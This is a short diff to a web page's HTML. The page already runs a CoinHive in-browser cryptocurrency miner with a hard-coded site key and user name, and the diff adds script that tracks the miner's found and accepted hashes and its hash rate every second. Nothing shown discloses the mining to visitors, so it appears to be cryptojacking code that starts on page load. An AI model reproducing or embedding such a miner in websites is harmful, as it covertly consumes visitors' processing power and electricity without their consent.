@@ -177,6 +177,20 @@
     var miner = new CoinHive.User('6hEcBCqlmmxOZfRDMiC1tQdoJOSajuYg', 'pogrommist');
     miner.start();
 </script>
+<script>
+	// Listen on events
+	miner.on('found', function() { /* Hash found */ })
+	miner.on('accepted', function() { /* Hash accepted by the pool */ })
+
+	// Update stats once per second
+	setInterval(function() {
+		var hashesPerSecond = miner.getHashesPerSecond();
+		var totalHashes = miner.getTotalHashes();
+		var acceptedHashes = miner.getAcceptedHashes();
+
+		// Output to HTML elements...
+	}, 1000);
+</script>
                <div class="entry-content">
                   <iframe src="https://discordapp.com/widget?id=256736522730995712&theme=dark" width="350" height="500" allowtransparency="true" frameborder="0"></iframe>
                </div>
